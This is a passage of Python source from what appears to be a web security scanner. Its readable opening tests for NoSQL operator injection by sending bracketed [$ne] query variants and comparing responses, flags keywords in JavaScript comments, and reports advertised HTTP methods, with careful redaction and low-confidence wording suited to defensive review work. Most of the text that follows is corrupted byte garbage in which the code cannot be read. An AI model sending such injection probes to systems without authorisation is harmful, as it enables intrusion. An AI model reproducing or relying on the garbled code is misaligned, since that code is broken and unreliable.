        baseline_b = self._request(normal_url)
        tested_a = self._request(operator_url)
        tested_b = self._request(operator_url)
        # Echoing a marker or its encoded form is not evidence of query
        # operator handling and makes response comparison misleading.
        outputs = (baseline_a, baseline_b, tested_a, tested_b)
        if any(marker in result.text or quote_plus(marker) in result.text
               for result in outputs):
            return None
        def signature(response: Response) -> tuple[int, str]:
            return (response.status,
                    sha256(response.text.encode("utf-8", "replace")).hexdigest())
        left = signature(baseline_a)
        right = signature(tested_a)
        if (left != signature(baseline_b)
                or right != signature(tested_b) or left == right):
            return None
        return self._finding(
            rule="WEB-NOSQL-REVIEW-001",
            title="GET bracket-operator response differential",
            severity="info", confidence="low", url=finding.url,
            parameter=finding.parameter, method="GET",
            evidence="Repeated scalar and [$ne] query variants produced stable "
                     "different responses; input validation may explain the result.",
            vector=f"Compare GET {redact_url(finding.url)} with scalar and bracketed parameter variants.",
            patch="Use typed input validation; reject unexpected object operators.",
            flag_path="Manual validation is required; this is not a confirmed NoSQL injection.",
        )

    def _comment_hint_finding(self, response: Response, keywords: set[str]) -> Finding:
        """Classify observed comment indicators without retaining comment text."""
        return self._finding(
            rule="WEB-COMMENT-HINT-001",
            title="Source comment contains review keywords",
            severity="info", confidence="medium", url=response.url,
            evidence="Comment keyword categories: " + ", ".join(sorted(keywords)) +
                     "; comment content omitted; no sensitive data exposure proven.",
            vector=f"Review comments manually in GET {redact_url(response.url)}.",
            patch="Remove sensitive implementation notes from public HTML/JavaScript assets.",
        )

    def _js_comment_hints(self, response: Response) -> list[Finding]:
        """Scan bounded JavaScript comment syntax without executing scripts."""
        if response.status != 200:
            return []
        comments = _js_comments(response.text[:MAX_BODY])
        keywords = set()
        for comment in comments[:100]:
            keywords.update(_comment_keywords(comment))
        return [self._comment_hint_finding(response, keywords)] if keywords else []

    def _metadata_findings(self, response: Response, method: str) -> list[Finding]:
        """Summarize metadata headers without disclosing server banner values."""
        items = []
        allowed = response.headers.get("allow", "")
        if allowed:
            standard = {"GET", "HEAD", "OPTIONS", "POST", "PUT", "PATCH",
                        "DELETE", "TRACE", "CONNECT"}
            names = sorted(set(allowed.upper().replace(" ", "").split(",")) & standard)
            if names:
                items.append(self._finding(
                    rule="WEB-HTTP-ALLOW-001",
                    title="HTTP methods advertised by server",
                    severity="info", confidence="high", url=response.url,
                    method=method,
                    evidence="Allow header advertises methods: " + ", ".join(names) +
                             "; availability does not imply authorization.",
                    vector=f"Inspect {method} response headers for {redact_url(response.url)}.",
                    patch="Restrict HTTP methods to those required by the application.",
                ))
       -vÛKh‘éì¶»§q«^t€É½ÕÑ•Ì¹…‘¡™½Õ¹¤(€€€€€€€É•ÑÕÉ¸Í½ÉÑ•¡É½ÕÑ•Ì¤((€€€ÍÑ…Ñ¥µ•Ñ¡½(€€€‘•˜}ÍÑ…Ñ¥}…Á¥}¡¥¹ÑÌ¡Í½ÕÉ”èÍÑÈ¤€´ø±¥ÍÑmÑÕÁ±•mÍÑÈ°ÍÑÉutè(€€€€€€€€ˆˆ‰…Ñ…±½œ±¥Ñ•É…°A$É½ÕÑ”¡¥¹ÑÌì‘¼¹½Ð•¹ÅÕ•Õ”¹½¸µPµ•Ñ¡½‘Ì¸ˆˆˆ(€€€€€€€Í½ÕÉ”€ôÍ½ÕÉ•lé5a}	=et(€€€€€€€É½ÕÑ•ÌèÍ•ÑmÑÕÁ±•mÍÑÈ°ÍÑÉut€ôÍ•Ð ¤(€€€€€€€™½Èµ•Ñ¡½°Á…Ñ ¥¸É”¹™¥¹‘…±° (€€€€€€€€€€€Èˆˆ‰q‰…á¥½Íp¸¡Á½ÍÑñÁÕÑñÁ…Ñ¡ñ‘•±•Ñ”¥qÌ©p¡qÌ©lœ‰t¡mxœ‰t¬¥lœ‰tˆˆˆ°(€€€€€€€€€€€Í½ÕÉ”°É”¹$°(€€€€€€€€¤è(€€€€€€€€€€€É½ÕÑ•Ì¹…‘ ¡µ•Ñ¡½¹ÕÁÁ•È ¤°Á…Ñ ¤¤(€€€€€€€™½ÈÁ…Ñ °µ•Ñ¡½¥¸É”¹™¥¹‘…±° (€€€€€€€€€€€Èˆˆ‰q‰™•Ñ¡qÌ©p¡qÌ©lœ‰t¡mxœ‰t¬¥lœ‰uqÌ¨±qÌ©qíqÌ©µ•Ñ¡½‘qÌ¨éqÌ©lœ‰t¡A=MQñAUQñAQ!ñ1Q¥lœ‰tˆˆˆ°(€€€€€€€€€€€Í½ÕÉ”°É”¹$°(€€€€€€€€¤è(€€€€€€€€€€€É½ÕÑ•Ì¹…‘ ¡µ•Ñ¡½¹ÕÁÁ•È ¤°Á…Ñ ¤¤(€€€€€€€™½ÈÁ…Ñ °µ•Ñ¡½¥¸É”¹™¥¹‘…±° (€€€€€€€€€€€Èˆˆ‰p‘p¹…©…áqÌ©p¡qÌ©qíqÌ©ÕÉ±qÌ¨éqÌ©lœ‰t¡mxœ‰t¬¥lœ‰uqÌ¨±qÌ¨ üéµ•Ñ¡½‘ñÑåÁ”¥qÌ¨éqÌ©lœ‰t¡A=MQñAUQñAQ!ñ1Q¥lœ‰tˆˆˆ°(€€€€€€€€€€€Í½ÕÉ”°É”¹$°(€€€€€€€€¤è(€€€€€€€€€€€É½ÕÑ•Ì¹…‘ ¡µ•Ñ¡½¹ÕÁÁ•È ¤°Á…Ñ ¤¤(€€€€€€€€Œ•ÁÐ‰½Ñ ­•ä½É‘•ÉÌ¥¸‰½Õ¹‘•°™±…Ð…á¥½Ì½©EÕ•Éä½¹™¥œ½‰©•ÑÌ¸(€€€€€€€€Œ=¹±ä…¹¹½Ñ…Ñ”µ•Ñ¡½‘ÌìÑ¡•Í”¡¥¹ÑÌ¹•Ù•È‰•½µ”…Ñ¥Ù”É•ÅÕ•ÍÑÌ¸(€€€€€€€½¹™¥Ì€ôÉ”¹™¥¹‘…±° (€€€€€€€€€€€Èˆˆˆ üéq‰…á¥½Ì üép¹É•ÅÕ•ÍÐ¤ýñp‘p¹…©…à¥qÌ©p¡qÌ©qì¡myíõuìÄ°ÌÈÁô¥qôˆˆˆ°(€€€€€€€€€€€Í½ÕÉ”°É”¹$°(€€€€€€€€¤(€€€€€€€™½È½ÁÑ¥½¹Ì¥¸½¹™¥ÍlèÄÀÁtè(€€€€€€€€€€€µ•Ñ¡½€ôÉ”¹Í•…É  (€€€€€€€€€€€€€€€Èˆˆˆ üéyð°¥qÌ¨ üéµ•Ñ¡½‘ñÑåÁ”¥qÌ¨éqÌ©lœ‰t¡A=MQñAUQñAQ!ñ1Q¥lœ‰tˆˆˆ°(€€€€€€€€€€€€€€€½ÁÑ¥½¹Ì°É”¹$°(€€€€€€€€€€€€¤(€€€€€€€€€€€ÕÉ°€ôÉ”¹Í•…É  (€€€€€€€€€€€€€€€Èˆˆˆ üéyð°¥qÌ©ÕÉ±qÌ¨éqÌ©lœ‰t¡mxœ‰uìÄ°ÈÔÙô¥lœ‰uqÌ¨ üô±ð¤ˆˆˆ°(€€€€€€€€€€€€€€€½ÁÑ¥½¹Ì°É”¹$°(€€€€€€€€€€€€¤(€€€€€€€€€€€¥˜µ•Ñ¡½…¹ÕÉ°è(€€€€€€€€€€€€€€€É½ÕÑ•Ì¹…‘ ¡µ•Ñ¡½¹É½ÕÀ Ä¤¹ÕÁÁ•È ¤°ÕÉ°¹É½ÕÀ Ä¤¤¤(€€€€€€€€Œ™•Ñ  ¤µ…ä¥¹±Õ‘”™±…Ð½ÁÑ¥½¹Ì‰•™½É”¥ÑÌµ•Ñ¡½‘•±…É…Ñ¥½¸¸(€€€€€€€™½ÈÁ…Ñ °½ÁÑ¥½¹Ì¥¸É”¹™¥¹‘…±° (€€€€€€€€€€€Èˆˆ‰q‰™•Ñ¡qÌ©p¡qÌ©lœ‰t¡mxœ‰uìÄ°ÈÔÙô¥lœ‰uqÌ¨±qÌ©qì¡myíõuìÄ°ÌÈÁô¥qôˆˆˆ°(€€€€€€€€€€€Í½ÕÉ”°É”¹$°(€€€€€€€€¥lèÄÀÁtè(€€€€€€€€€€€µ•Ñ¡½€ôÉ”¹Í•…É  (€€€€€€€€€€€€€€€Èˆˆˆ üéyð°¥qÌ©µ•Ñ¡½‘qÌ¨éqÌ©lœ‰t¡A=MQñAUQñAQ!ñ1Q¥lœ‰tˆˆˆ°(€€€€€€€€€€€€€€€½ÁÑ¥½¹Ì°É”¹$°(€€€€€€€€€€€€¤(€€€€€€€€€€€¥˜µ•Ñ¡½è(€€€€€€€€€€€€€€€É½ÕÑ•Ì¹…‘ ¡µ•Ñ¡½¹É½ÕÀ Ä¤¹ÕÁÁ•È ¤°Á…Ñ ¤¤(€€€€€€€™½ÈÁ…Ñ ¥¸É”¹™¥¹‘…±° (€€€€€€€€€€€Èˆˆ‰lœ‰t ¼ üé…Á¥ñÙlÄ´åuq©ñ…‘µ¥¹ñ¥¹Ñ•É¹…°¤½mxœ‰qÍuìÀ°ÄØÁô¥lœ‰tˆˆˆ°(€€€€€€€€€€€Í½ÕÉ”°É”¹$ðÉ”¹°(€€€€€€€€¤è(€€€€€€€€€€€¥˜¹½Ð…¹ä¡™½Õ¹€ôôÁ…Ñ ™½È|°™½Õ¹¥¸É½ÕÑ•Ì¤è(€€€€€€€€€€€€€€€É½ÕÑ•Ì¹…‘  ‰U9-9=]8ˆ°Á…Ñ ¤¤(€€€€€€€É•ÑÕÉ¸Í½ÉÑ• ¡µ•Ñ¡½°Á…Ñ ¤™½Èµ•Ñ¡½°Á…Ñ ¥¸É½ÕÑ•Ì(€€€€€€€€€€€€€€€€€€€€€¥˜€¡Á…Ñ ¹ÍÑ…ÉÑÍÝ¥Ñ   ˆ¼ˆ°€ˆ¸¼ˆ°€ˆ¸¸¼ˆ°€‰¡ÑÑÀè¼¼ˆ°€‰¡ÑÑÁÌè¼¼ˆ¤¤(€€€€€€€€€€€€€€€€€€€€€€€€€…¹¹½ÐÁ…Ñ ¹ÍÑ…ÉÑÍÝ¥Ñ  ˆ¼¼ˆ¤(€€€€€€€€€€€€€€€€€€€€€€€€€…¹¹½Ð…¹ä¡ ¥¸Á…Ñ ™½È ¥¸€ ‰ìˆ°€‰ôˆ°€‰qpˆ°€‰qÈˆ°€‰q¸ˆ¤¤¤¥lèÈÁt((€€€‘•˜}©Í}…Á¥}™¥¹‘¥¹Ì¡Í•±˜°É•ÍÁ½¹Í”èI•ÍÁ½¹Í”¤€´ø±¥ÍÑm¥¹‘¥¹tè(€€€€€€€¥˜É•ÍÁ½¹Í”¹ÍÑ…ÑÕÌ€„ô€ÈÀÀè(€€€€€€€€€€€É•ÑÕÉ¸mt(€€€€€€€½ÕÐ€ômt(€€€€€€€™½Èµ•Ñ¡½°Á…Ñ ¥¸Í•±˜¹}ÍÑ…Ñ¥}…Á¥}¡¥¹ÑÌ¡É•ÍÁ½¹Í”¹Ñ•áÐ¤è(€€€€€€€€€€€ÑÉäè(€€€€€€€€€€€€€€€…‰Í½±ÕÑ”€ôÕÉ±©½¥¸¡É•ÍÁ½¹Í”¹ÕÉ°°Á…Ñ ¤(€€€€€€€€€€€€€€€Á…ÉÍ•€ôÕÉ±ÍÁ±¥Ð¡…‰Í½±ÕÑ”¤(€€€€€€€€€€€€€€€¥˜€¡¹½ÐÍ•±˜¹}¥¹}Í½Á”¡…‰Í½±ÕÑ”¤½ÈÁ…ÉÍ•¹ÕÍ•É¹…µ”½ÈÁ…ÉÍ•¹Á…ÍÍÝ½É(€€€€€€€€€€€€€€€€€€€€€€€½ÈÁ…ÉÍ•¹Í¡•µ”¹½Ð¥¸ì‰¡ÑÑÀˆ°€‰¡ÑÑÁÌ‰ô¤è(€€€€€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”(€€€€€€€€€€€•á•ÁÐY…±Õ•ÉÉ½Èè(€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”(€€€€€€€€€€€½ÕÐ¹…ÁÁ•¹¡Í•±˜¹}™¥¹‘¥¹œ (€€€€€€€€€€€€€€€ÉÕ±”ô‰]µ)LµA$µ!%9P´ÀÀÄˆ°(€€€€€€€€€€€€€€€Ñ¥Ñ±”ô‰MÑ…Ñ¥Œ)…Ù…MÉ¥ÁÐA$É½ÕÑ”¡¥¹Ðˆ°(€€€€€€€€€€€€€€€Í•Ù•É¥Ñäô‰¥¹™¼ˆ°½¹™¥‘•¹”ô‰±½Üˆ°ÕÉ°õ…‰Í½±ÕÑ”°(€€€€€€€€€€€€€€€µ•Ñ¡½õµ•Ñ¡½°•Ù¥‘•¹”ô¡˜‰1¥Ñ•É…°íµ•Ñ¡½‘ôA$É½ÕÑ”…¹¹½Ñ…Ñ¥½¸ì€ˆ(€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€‰É•…¡…‰¥±¥Ñä…¹…ÕÑ¡½É¥é…Ñ¥½¸¡…Ù”¹½Ð‰••¸¡•­•¸ˆ¤°(€€€€€€€€€€€€€€€Ù•Ñ½Èõ˜‰I•Ù¥•ÜÑ¡”Í½ÕÉ”¥¸PíÉ•‘…Ñ}ÕÉ°¡É•ÍÁ½¹Í”¹ÕÉ°¥ôì¹¼É•ÅÕ•ÍÐÝ…ÌÍ•¹ÐÑ¼Ñ¡¥ÌÉ½ÕÑ”¸ˆ°(€€€€€€€€€€€€€€€Á…Ñ ô‰ÁÁ±äÍ•ÉÙ•ÈµÍ¥‘”…ÕÑ¡½É¥é…Ñ¥½¸…¹¥¹ÁÕÐÙ…±¥‘…Ñ¥½¸½¸•Ù•ÉäA$É½ÕÑ”¸ˆ°(€€€€€€€€€€€€¤¤(€€€€€€€É•ÑÕÉ¸½ÕÐ((€€€‘•˜}½±±•Ñ}µ•Ñ…‘…Ñ„¡Í•±˜°É•Á½ÉÐèM…¹I•Á½ÉÐ¤€´ø9½¹”è(€€€€€€€™½Èµ•Ñ¡½¥¸€ ‰!ˆ°€‰=AQ%=9Lˆ¤è(€€€€€€€€€€€¥˜Í•±˜¹É•ÅÕ•ÍÑÍ}Í•¹Ð€øôÍ•±˜¹µ…á}É•ÅÕ•ÍÑÌè(€€€€€€€€€€€€€€€‰É•…¬(€€€€€€€€€€€ÑÉäè(€€€€€€€€€€€€€€€µ•Ñ…‘…Ñ„€ôÍ•±˜¹}É•ÅÕ•ÍÐ¡Í•±˜¹Ñ…É•Ð°µ•Ñ¡½¤(€€€€€€€€€€€€€€€É•Á½ÉÐ¹™¥¹‘¥¹Ì¹•áÑ•¹¡Í•±˜¹}Á½ÍÑÕÉ•}™¥¹‘¥¹Ì¡µ•Ñ…‘…Ñ„°µ•Ñ¡½¤¤(€€€€€€€€€€€€€€€É•Á½ÉÐ¹™¥¹‘¥¹Ì¹•áÑ•¹¡Í•±˜¹}µ•Ñ…‘…Ñ…}™¥¹‘¥¹Ì¡µ•Ñ…‘…Ñ„°µ•Ñ¡½¤¤(€€€€€€€€€€€•á•ÁÐ€¡=MÉÉ½È°IÕ¹Ñ¥µ•ÉÉ½È°Y…±Õ•ÉÉ½È¤è(€€€€€€€€€€€€€€€É•Á½ÉÐ¹•ÉÉ½ÉÌ¹…ÁÁ•¹¡˜‰íµ•Ñ¡½‘ôµ•Ñ…‘…Ñ„É•ÅÕ•ÍÐ™…¥±•ˆ¤((€€€‘•˜}ÍÉ¥ÁÑ}É½ÕÑ•Ì¡Í•±˜°É•ÍÁ½¹Í”èI•ÍÁ½¹Í”°Á…ÉÍ•ÈèA…•A…ÉÍ•È°(€€€€€€€€€€€€€€€€€€€€€€É•Á½ÉÐèM…¹I•Á½ÉÐ¤€´ø±¥ÍÐè(€€€€€€€€Œá…µ¥¹”¥¹±¥¹”ÍÉ¥ÁÑÌ…¹‰½Õ¹‘•Í…µ”µ½É¥¥¸)…Ù…MÉ¥ÁÐ™¥±•Ì™½È(€€€€€€€€Œ±¥Ñ•É…°PÉ½ÕÑ•Ì¸9•Ù•È•á•ÕÑ”)…Ù…MÉ¥ÁÐ½È¥ÍÍÕ”¥¹™•ÉÉ•A=MQÌ¸(€€€€€€€É½ÕÑ•Ì€ômt(€€€€€€€É½ÕÑ•Ì¹•áÑ•¹¡Í•±˜¹}ÍÑ…Ñ¥}•Ñ}É½ÕÑ•Ì¡É•ÍÁ½¹Í”¹Ñ•áÐ¤¤(€€€€€€€™½ÈÍÉ¥ÁÐ¥¸Á…ÉÍ•È¹ÍÉ¥ÁÑÍlèÄÁtè(€€€€€€€€€€€ÍÉ¥ÁÑ}ÕÉ°€ôÍ•±˜¹}±•…¹}ÕÉ°¡ÕÉ±©½¥¸¡É•ÍÁ½¹Í”¹ÕÉ°°ÍÉ¥ÁÐ¤¤(€€€€€€€€€€€¥˜¹½ÐÍ•±˜¹}¥¹}Í½Á”¡ÍÉ¥ÁÑ}ÕÉ°¤½ÈÍ•±˜¹É•ÅÕ•ÍÑÍ}Í•¹Ð€øôÍ•±˜¹µ…á}É•ÅÕ•ÍÑÌè(€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”(€€€€€€€€€€€ÑÉäè(€€€€€€€€€€€€€€€©Ì€ôÍ•±˜¹}É•ÅÕ•ÍÐ¡ÍÉ¥ÁÑ}ÕÉ°¤(€€€€€€€€€€€€€€€¥˜±•¸¡©Ì¹Ñ•áÐ¤€ðô5a}	=d…¹©Ì¹ÍÑ…ÑÕÌ€ôô€ÈÀÀè(€€€€€€€€€€€€€€€€€€€É½ÕÑ•Ì¹•áÑ•¹¡Í•±˜¹}ÍÑ…Ñ¥}•Ñ}É½ÕÑ•Ì¡©Ì¹Ñ•áÐ¤¤(€€€€€€€€€€€€€€€€€€€É•Á½ÉÐ¹™¥¹‘¥¹Ì¹•áÑ•¹¡Í•±˜¹}Í½ÕÉ•}µ…Á}¡¥¹ÑÌ¡©Ì¤¤(€€€€€€€€€€€€€€€€€€€É•Á½ÉÐ¹™¥¹‘¥¹Ì¹•áÑ•¹¡Í•±˜¹}©Í}½µµ•¹Ñ}¡¥¹ÑÌ¡©Ì¤¤(€€€€€€€€€€€€€€€€€€€É•Á½ÉÐ¹™¥¹‘¥¹Ì¹•áÑ•¹¡Í•±˜¹}©Í}…Á¥}™¥¹‘¥¹Ì¡©Ì¤¤(€€€€€€€€€€€•á•ÁÐ€¡=MÉÉ½È°IÕ¹Ñ¥µ•ÉÉ½È°Y…±Õ•ÉÉ½È¤è(€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”(€€€€€€€É•ÑÕÉ¸É½ÕÑ•Ì((€€€‘•˜}•¹ÅÕ•Õ•}É½ÕÑ•Ì¡Í•±˜°É•ÍÁ½¹Í”èI•ÍÁ½¹Í”°É½ÕÑ•Ìè±¥ÍÐ°Í••¸èÍ•ÑmÍÑÉt°ÅÕ•Õ”è‘•ÅÕ”¤€´ø9½¹”è(€€€€€€€™½È¡É•˜¥¸É½ÕÑ•Ìè(€€€€€€€€€€€ÑÉäè(€€€€€€€€€€€€€€€¹áÐ€ôÍ•±˜¹}±•…¹}ÕÉ°¡ÕÉ±©½¥¸¡É•ÍÁ½¹Í”¹ÕÉ°°¡É•˜¤¤(€€€€€€€€€€€€€€€Á…ÉÍ•‘}¹áÐ€ôÕÉ±ÍÁ±¥Ð¡¹áÐ¤(€€€€€€€€€€€€€€€¥˜Á…ÉÍ•‘}¹áÐ¹Í¡•µ”¹½Ð¥¸ì‰¡ÑÑÀˆ°€‰¡ÑÑÁÌ‰ôè(€€€€€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”(€€€€€€€€€€€€€€€¥˜Í•±˜¹}¥¹}Í½Á”¡¹áÐ¤…¹¹áÐ¹½Ð¥¸Í••¸…¹¹áÐ¹½Ð¥¸ÅÕ•Õ”è(€€€€€€€€€€€€€€€€€€€ÅÕ•Õ”¹…ÁÁ•¹¡¹áÐ¤(€€€€€€€€€€€•á•ÁÐY…±Õ•ÉÉ½Èè(€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”((€€€‘•˜}É…Ý°¡Í•±˜°É•Á½ÉÐèM…¹I•Á½ÉÐ¤€´øÑÕÁ±•m¥¹Ð°±¥ÍÑm¥¹‘¥¹t°¥¹Ñtè(€€€€€€€ÅÕ•Õ”€ô‘•ÅÕ”¡‘¥Ð¹™É½µ­•åÌ ¡Í•±˜¹Ñ…É•Ð°€©Í•±˜¹¥¹Ù•¹Ñ½Éå}ÕÉ±Ì¤¤¤(€€€€€€€Í••¸èÍ•ÑmÍÑÉt€ôÍ•Ð ¤(€€€€€€€ÍÕ•ÍÍ™Õ±}Á…•Ì€ô€À(€€€€€€€…¹‘¥‘…Ñ•Ìè±¥ÍÑm¥¹‘¥¹t€ômt(€€€€€€€‘¥Í½Ù•É•‘}É½ÕÑ•Ì€ô€À(€€€€€€€Ý¡¥±”ÅÕ•Õ”…¹±•¸¡Í••¸¤€ðÍ•±˜¹µ…á}Á…•Ì…¹Í•±˜¹É•ÅÕ•ÍÑÍ}Í•¹Ð€ðÍ•±˜¹µ…á}É•ÅÕ•ÍÑÌè(€€€€€€€€€€€ÕÉ°€ôÅÕ•Õ”¹Á½Á±•™Ð ¤(€€€€€€€€€€€¥˜ÕÉ°¥¸Í••¸è(€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”(€€€€€€€€€€€Í••¸¹…‘¡ÕÉ°¤(€€€€€€€€€€€ÑÉäè(€€€€€€€€€€€€€€€É•ÍÁ½¹Í”€ôÍ•±˜¹}É•ÅÕ•ÍÐ¡ÕÉ°¤(€€€€€€€€€€€•á•ÁÐ€¡=MÉÉ½È°IÕ¹Ñ¥µ•ÉÉ½È°Y…±Õ•ÉÉ½È¤è(€€€€€€€€€€€€€€€É•Á½ÉÐ¹•ÉÉ½ÉÌ¹…ÁÁ•¹¡˜‰íÉ•‘…Ñ}ÕÉ°¡ÕÉ°¥ôèÉ•ÅÕ•ÍÐ™…¥±•ˆ¤(€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”(€€€€€€€€€€€ÍÕ•ÍÍ™Õ±}Á…•Ì€¬ô€Ä(€€€€€€€€€€€Á…ÉÍ•È€ôA…•A…ÉÍ•È ¤(€€€€€€€€€€€ÑåÁ”€ôÉ•ÍÁ½¹Í”¹¡•…‘•ÉÌ¹•Ð ‰½¹Ñ•¹ÐµÑåÁ”ˆ°€ˆˆ¤(€€€€€€€€€€€¥Í}¡Ñµ°€ô€‰¡Ñµ°ˆ¥¸ÑåÁ”½È!Q51}5I-H¥¸É•ÍÁ½¹Í”¹Ñ•áÑlèÔÀÁt¹±½Ý•È ¤(€€€€€€€€€€€¥˜¥Í}¡Ñµ°è(€€€€€€€€€€€€€€€Á…ÉÍ•È¹™••¡É•ÍÁ½¹Í”¹Ñ•áÐ¤(€€€€€€€€€€€Í•±˜¹½‰Í•ÉÙ…Ñ¥½¹ÍmÉ•ÍÁ½¹Í”¹ÕÉ±t€ôÍ•±˜¹}½‰Í•ÉÙ”¡É•ÍÁ½¹Í”°Á…ÉÍ•È¤(€€€€€€€€€€€¥Ñ•µÌ€ôÍ•±˜¹}Á½ÍÑÕÉ•}™¥¹‘¥¹Ì¡É•ÍÁ½¹Í”¤€¬Í•±˜¹}Á…ÍÍ¥Ù•}™¥¹‘¥¹Ì¡É•ÍÁ½¹Í”°Á…ÉÍ•È¤(€€€€€€€€€€€É•Á½ÉÐ¹™¥¹‘¥¹Ì¹•áÑ•¹¡¥Ñ•µÌ¤(€€€€€€€€€€€…¹‘¥‘…Ñ•Ì¹•áÑ•¹¡¥Ñ•´™½È¥Ñ•´¥¸¥Ñ•µÌ¥˜¥Ñ•´¹ÉÕ±”¥¸ì‰]µME1$´ÀÀÄˆ°€‰]µMMQ$´ÀÀÄˆ°€‰]µ5$´ÀÀÄˆ°€‰]µ%1´ÀÀÄˆ°€‰]µI%H´ÀÀÄˆ°€‰]µaML´ÀÀÄ‰ô¤(€€€€€€€€€€€É½ÕÑ•Ì€ô±¥ÍÐ¡Á…ÉÍ•È¹±¥¹­Ì¤(€€€€€€€€€€€¥˜¥Í}¡Ñµ°è(€€€€€€€€€€€€€€€É½ÕÑ•Ì¹•áÑ•¹¡Í•±˜¹}ÍÉ¥ÁÑ}É½ÕÑ•Ì¡É•ÍÁ½¹Í”°Á…ÉÍ•È°É•Á½ÉÐ¤¤(€€€€€€€€€€€‘¥Í½Ù•É•‘}É½ÕÑ•Ì€¬ô±•¸¡É½ÕÑ•Ì¤(€€€€€€€€€€€Í•±˜¹}•¹ÅÕ•Õ•}É½ÕÑ•Ì¡É•ÍÁ½¹Í”°É½ÕÑ•Ì°Í••¸°ÅÕ•Õ”¤(€€€€€€€É•ÑÕÉ¸ÍÕ•ÍÍ™Õ±}Á…•Ì°…¹‘¥‘…Ñ•Ì°‘¥Í½Ù•É•‘}É½ÕÑ•Ì((€€€‘•˜}ÉÕ¹}…Ñ¥Ù•}ÁÉ½‰•Ì¡Í•±˜°É•Á½ÉÐèM…¹I•Á½ÉÐ°…¹‘¥‘…Ñ•Ìè±¥ÍÑm¥¹‘¥¹t¤€´ø9½¹”è(€€€€€€€ÁÉ½‰•}ÁÉ¥½É¥Ñä€ôì(€€€€€€€€€€€€‰]µ5$´ÀÀÄˆè€À°(€€€€€€€€€€€€‰]µMMQ$´ÀÀÄˆè€Ä°(€€€€€€€€€€€€‰]µME1$´ÀÀÄˆè€È°(€€€€€€€€€€€€‰]µ%1´ÀÀÄˆè€Ì°(€€€€€€€€€€€€‰]µI%H´ÀÀÄˆè€Ð°(€€€€€€€€€€€€‰]µaML´ÀÀÄˆè€Ô°(€€€€€€€ô(€€€€€€€™½È™¥¹‘¥¹œ¥¸Í½ÉÑ•¡…¹‘¥‘…Ñ•Ì°­•äõ±…µ‰‘„¥Ñ•´è€ (€€€€€€€€€€€€€€€ÁÉ½‰•}ÁÉ¥½É¥Ñä¹•Ð¡¥Ñ•´¹ÉÕ±”°€ä¤°¥Ñ•´¹ÕÉ°°¥Ñ•´¹Á…É…µ•Ñ•È°¥Ñ•´¹¥¤¤è(€€€€€€€€€€€¥˜Í•±˜¹É•ÅÕ•ÍÑÍ}Í•¹Ð€¬€È€øÍ•±˜¹µ…á}É•ÅÕ•ÍÑÌè(€€€€€€€€€€€€€€€‰É•…¬(€€€€€€€€€€€ÑÉäè(€€€€€€€€€€€€€€€½¹™¥Éµ•€ôÍ•±˜¹}…Ñ¥Ù•}ÁÉ½‰”¡™¥¹‘¥¹œ¤(€€€€€€€€€€€€€€€¥˜½¹™¥Éµ•è(€€€€€€€€€€€€€€€€€€€É•Á½ÉÐ¹™¥¹‘¥¹Ì¹…ÁÁ•¹¡½¹™¥Éµ•¤(€€€€€€€€€€€•á•ÁÐ€¡=MÉÉ½È°IÕ¹Ñ¥µ•ÉÉ½È°Y…±Õ•ÉÉ½È¤è(€€€€€€€€€€€€€€€É•Á½ÉÐ¹•ÉÉ½ÉÌ¹…ÁÁ•¹¡˜‰…Ñ¥Ù”íÉ•‘…Ñ}ÕÉ°¡™¥¹‘¥¹œ¹ÕÉ°¥ôí™¥¹‘¥¹œ¹Á…É…µ•Ñ•ÉôèÉ•ÅÕ•ÍÐ™…¥±•ˆ¤((€€€‘•˜}ÉÕ¹}¹½ÍÅ±}É•Ù¥•ÝÌ¡Í•±˜°É•Á½ÉÐèM…¹I•Á½ÉÐ°…¹‘¥‘…Ñ•Ìè±¥ÍÑm¥¹‘¥¹t¤€´ø9½¹”è(€€€€€€€É•Ù¥•Ý•èÍ•ÑmÑÕÁ±•mÍÑÈ°ÍÑÉut€ôÍ•Ð ¤(€€€€€€€™½È™¥¹‘¥¹œ¥¸…¹‘¥‘…Ñ•Ìè(€€€€€€€€€€€¥˜™¥¹‘¥¹œ¹µ•Ñ¡½€„ô€‰Pˆ½È™¥¹‘¥¹œ¹ÉÕ±”€„ô€‰]µME1$´ÀÀÄˆè(€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”(€€€€€€€€€€€­•ä€ô€¡™¥¹‘¥¹œ¹ÕÉ°°™¥¹‘¥¹œ¹Á…É…µ•Ñ•È¤(€€€€€€€€€€€¥˜­•ä¥¸É•Ù¥•Ý•è(€€€€€€€€€€€€€€€½¹Ñ¥¹Õ”(€€€€€€€€€€€É•Ù¥•Ý•¹…‘¡­•ä¤(€€€€€€€€€€€¥˜±•¸¡É•Ù¥•Ý•¤€ø€Ì½ÈÍ•±˜¹É•ÅÕ•ÍÑÍ}Í•¹Ð€¬€Ð€øÍ•±˜¹µ…á}É•ÅÕ•ÍÑÌè(€€€€€€€€€€€€€€€‰É•…¬(€€€€€€€€€€€ÑÉäè(€€€€€€€€€€€€€€€É•Ù¥•Ü€ôÍ•±˜¹}¹½ÍÅ±}ÅÕ•Éå}É•Ù¥•Ü¡™¥¹‘¥¹œ¤(€€€€€€€€€€€€€€€¥˜É•Ù¥•Üè(€€€€€€€€€€€€€€€€€€€É•Á½ÉÐ¹™¥¹‘¥¹Ì¹…ÁÁ•¹¡É•Ù¥•Ü¤(€€€€€€€€€€€•á•ÁÐ€¡=MÉÉ½È°IÕ¹Ñ¥µ•ÉÉ½È°Y…±Õ•ÉÉ½È¤è(€€€€€€€€€€€€€€€É•Á½ÉÐ¹•ÉÉ½ÉÌ¹…ÁÁ•¹ 